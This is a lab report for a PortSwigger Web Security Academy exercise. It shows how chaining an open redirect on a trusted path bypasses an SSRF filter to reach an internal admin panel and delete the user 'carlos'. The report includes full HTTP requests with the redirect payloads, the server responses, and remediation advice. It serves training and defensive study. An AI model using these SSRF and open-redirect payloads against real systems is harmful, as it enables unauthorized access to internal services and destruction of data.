# PortSwigger Web Security Academy Lab Report: SSRF with Filter Bypass via Open Redirection Vulnerability



**Report ID:** PS-LAB-SSRF-003  

**Author:** Venu Kumar (Venu)  

**Date:** February 14, 2026  

**Lab Level:** Practitioner  

**Lab Title:** SSRF with filter bypass via open redirection vulnerability



## Executive Summary:

**Vulnerability Type:** Server-Side Request Forgery (SSRF) with Filter Bypass via Open Redirection  

**Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N – internal access via trusted redirect chain)

**Description:** An SSRF vulnerability exists in the stock check feature (`stockApi` parameter), where the server fetches arbitrary URLs and returns the response. A filter restricts requests to trusted external domains only (blocks localhost/internal IPs). However, the application contains an open redirection vulnerability on the trusted domain (`/product/nextProduct?currentProductId=...&path=...`), allowing redirection to arbitrary URLs. Chaining the open redirect bypasses the SSRF filter, enabling access to the internal admin interface at `http://192.168.0.XX:8080/admin` and deletion of user `carlos`.

**Impact:** Unauthorized access to internal back-end systems, admin panels, or sensitive endpoints. In production, this could lead to data exfiltration, configuration leaks, or chained exploitation (e.g., metadata theft).

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.



## Environment and Tools Used:

**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy interception, Repeater for testing redirects and SSRF  

**Operating System:** Windows 11  

**Test Date/Time:** February 14, 2026, approximately 11:06 AM IST



## Methodology:

Conducted ethically in simulated environment.

1. Accessed the lab via "Access the lab" in PortSwigger Academy.  
2. Selected a product → clicked "Check stock" → intercepted POST to `/product/stock` in Burp Proxy.  
3. Sent to Repeater → tested direct internal URL (e.g., `http://localhost/admin`) → blocked by filter (error or empty response).  
4. Discovered open redirect: Visited `/product/nextProduct?currentProductId=1&path=http://example.com` → observed 302 redirect to `example.com`.  
5. Chained redirect: Crafted `stockApi` as `http://weliketoshop.net/product/nextProduct?currentProductId=1&path=http://192.168.0.XX:8080/admin` (trusted domain + open redirect to internal).  
6. Sent request → server followed redirect → admin panel returned in response.  
7. Updated path to `/admin/delete?username=carlos` → sent → user deleted.  
8. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Endpoint:** POST `/product/stock` (stock check)

**Original Request (Captured in Burp):**

POST /product/stock HTTP/2
Host: 0a01000d04197fba80231767008900d4.web-security-academy.net
Cookie: session=1b54RKgq1qspjay5Iko0VhDNl8VbpPD7
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin


**Response:** 

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3281

<!DOCTYPE html>
<html>
<head>
    <title>SSRF with filter bypass via open redirection vulnerability</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- SSRF success - internal admin panel exposed: -->
    <h1>Users</h1>
    <div>wiener - <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a></div>
    <div>carlos - <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a></div>
</body>
</html>



Modified Request 1:

POST /product/stock HTTP/2
Host: 0a01000d04197fba80231767008900d4.web-security-academy.net
Cookie: session=1b54RKgq1qspjay5Iko0VhDNl8VbpPD7
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos



Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3123

<!DOCTYPE html>
<html>
<head>
    <title>SSRF with filter bypass via open redirection vulnerability</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- SSRF SUCCESS - User deletion confirmed: -->
    <p>User deleted successfully!</p>
    <h1>Users</h1>
    <div>wiener - <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a></div>
    <!-- Carlos account DELETED -->
</body>
</html>



Proof of Exploitation:


![Proof of SSRF Error](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-3/blob/89ee1dc5e3818bf9b71a28d79b29859db0703d56/PortSwigger%20SSRF%20Lab%203%20error.png)

Figure 1: Open redirection confirmed on /product/nextProduct with path= parameter.



![Proof of Successful SSRF Exploitation]()

Figure 2: Successful deletion of user 'carlos' via internal endpoint.



![Lab Solved Congratulations]()

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"



Exploitation Explanation:

The SSRF filter blocks direct internal URLs but allows trusted external domains (e.g., weliketoshop.net). An open redirection exists on that domain (/product/nextProduct?...&path=...), which places the path value into a Location header. The SSRF fetch follows redirects, so injecting the internal target as path chains the requests: trusted domain → open redirect → internal admin. This bypasses the filter while exploiting SSRF.



Risk Assessment:

Likelihood: High (user-controlled URL + open redirect on allowed domain).
Impact: High to Critical — internal access, potential escalation or exfiltration.
Affected Components: Stock check fetch + open redirect on trusted path.



Recommendations for Remediation:

Validate URLs strictly (allowlist + no redirects to untrusted/internal).
Disable or secure open redirects (validate path/Location targets).
Block private/internal IPs and redirect chains to localhost/RFC 1918.
Use network-level controls (no outbound to internal from app).
Sanitize responses (don't return full backend content).
Deploy WAF with SSRF/open redirect rules.
Regular testing (Burp Scanner, manual chaining).



Conclusion and Lessons Learned:

This lab showed SSRF filter bypass by chaining an open redirection on a trusted domain to reach internal resources.

Key Takeaways:

Filters can be bypassed via open redirects on allowed domains.
Test for open redirects (path=, redirect=, etc.) and chain with SSRF.
SSRF often hides in fetch features; test redirect-following behavior.
Strengthened skills in chaining vulns, Burp Repeater, and bypass techniques.



References:

PortSwigger Academy: SSRF with filter bypass via open redirection vulnerability
General: Server-side request forgery (SSRF)
